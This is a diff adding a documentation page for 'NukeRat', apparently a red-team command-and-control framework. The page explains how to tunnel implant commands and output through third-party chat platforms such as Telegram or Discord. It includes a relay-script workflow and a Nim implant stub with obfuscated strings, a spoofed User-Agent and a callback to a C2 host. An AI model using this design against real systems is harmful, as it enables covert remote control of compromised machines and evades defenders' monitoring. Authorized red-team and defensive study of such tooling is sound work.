@@ -1,0 +1,145 @@
+---
+title: Custom channels
+---
+
+import { Callout } from '@/ui/custom/callout';
+import customChannelMap from '@/assets/img/tutorial/map.png';
+import { ImageZoom } from 'fumadocs-ui/components/image-zoom';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+If you want a communication channel through external services like Telegram, Discord, and similar, this is the page for you.
+
+<Callout
+  type="warning"
+  title="Third party platforms"
+  className="rounded-[6px] border-red-500/70 bg-red-950/50 shadow-red-950/20 [&_svg]:text-red-400 [&_.text-fd-muted-foreground]:text-red-100/95 [&_p.font-medium]:text-red-200"
+>
+  The NukeRat project does not influence, recommend, or promote the use of third party platforms as command and control without explicit authorization from the operator and full compliance with applicable law. Names in the list above are illustrative examples only, not endorsement or guidance by the project.
+</Callout>
+
+## How it works
+
+To build a custom channel, it helps to explain quickly how the pieces fit. It basically has three pillars:
+
+1. HTTP listener
+2. Implant with a custom channel
+3. Custom script
+
+Together they carry communication between the implant and the team server without the implant making any request except to the authorized third party service you chose.
+
+The flow should look like the diagram below:
+
+<ImageZoom src={customChannelMap} alt="Custom channel flow" className="tutorial_img" />
+
+### ( 2 ) Listener
+
+You need an HTTP listener configured. You can use the team server API instead, but to keep things clear and practical we will use an HTTP listener in the examples.
+
+### ( 3 ) Custom script
+
+This is one of the most important steps. You write a script that talks to the third party service you chose and the listener, doing a kind of "translation".
+
+### ( 4 ) Third party platform
+
+This is the platform you chose as the external communication channel.
+
+### ( 5 ) Implant
+
+An implant that already includes custom communication logic from compile time.
+
+## Communication flow
+
+Now that you have a sense of the structure, it is easier to walk through a scenario with an external messaging platform, like a chat similar to Telegram.
+
+  <Steps>
+    <Step>
+      A `whoami` command is sent to the queue.
+    </Step>
+    <Step>
+      The custom script runs a loop that talks to the listener every 5 seconds to fetch commands. When it finds one, it sends a request to the external service, something like:
+
+      ```
+      input | 938192 | whoami
+      ```
+    </Step>
+    <Step>
+      On the external service, a message appears with that same content.
+    </Step>
+    <Step>
+      The implant already has its own requests to that external service, with the API keys and tokens needed to authenticate and send traffic. On each request it checks whether a command is waiting for it. When it finds one, it runs the command.
+
+      Then it sends a request to the external service with the result, something like:
+
+      ```
+      output | 938192 | whoami | root
+      ```
+    </Step>
+    <Step>
+      On one of its loops the custom script sees that output and sends a request to the listener as if it were the implant itself, following the communication format from [Implant API](/docs/rest-api/implants). After that it removes that content from the external service.
+    </Step>
+    <Step>
+      The listener receives the request, treats it like implant traffic, and completes the command.
+    </Step>
+  </Steps>
+
+## Custom script
+
+There is not much mystery here. You are responsible for a script that loops, watches the external service you chose, and forwards traffic to the listener. Depending on your goals you will hit more complexity here, especially around splitting very large outputs or inputs.
+
+## Custom channel
+
+As mentioned before, the implant must be built with communication logic for the service you chose, which means writing something custom and sometimes starting from scratch.
+
+To reach the custom channel during implant creation, open **Command and control** and select **Custom channel** under CHANNEL.
+
+Right after that a text area appears with a code stub that looks like this:
+
+```nim
+
+# imports...
+
+var customServerHost = obf("http://192.168.15.10:9090/")
+const delaySeconds = 2
+customCookies = toTable([
+  (obf("session"), obf("example")),
+  (obf("token"), obf("example")),
+])
+customHeaders = toTable([
+  (obf("User-Agent"), obf("Mozilla/5.0")),
+  (obf("X-Custom-Header"), obf("example")),
+])
+
+proc httpPost(
+    url, payload: string;
+    cookies: Table[string, string];
+    headers: Table[string, string]
+): tuple[code: uint16, body: string] =
+  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
+  for key, value in headers:
+    pairs.add((key, value))
+  var cookieParts: seq[string] = @[]
+  for key, value in cookies:
+    cookieParts.add(key & obf("=") & value)
+  if cookieParts.len > 0:
+    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
+  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
+  (code: r.code, body: r.body)
+
+# Rest of the code...
+```
+
+That is nothing more than the default HTTP communication written in procedural form so you can customize it more easily. You can change this logic to fit what you need.
+
+In more complex cases you may add extra helpers for fragmentation, encryption, and so on.
+
+## Relay and pivoting
+
+This part is annoying to tune but necessary. Next to the **Implant routine** tab you will see **Relay forwarder**, which is the logic used by the outbound relay.
+
+When you configure a relay, there is always a last relay that sends that traffic to the team server, and that traffic must be shaped into an HTTP request and JSON. This code block is responsible for that. So if you want relay together with custom channel, you need to adjust it too.
+
+For your relief, you can often adapt the same logic from **Implant routine** into **Relay forwarder**.
+
+## Tests upon tests
+
+Yes, building a custom channel can be tedious and complex, so we recommend testing the full logic before you rely on it in production. For each implant build you get the exception when your logic is wrong, which makes development much easier.
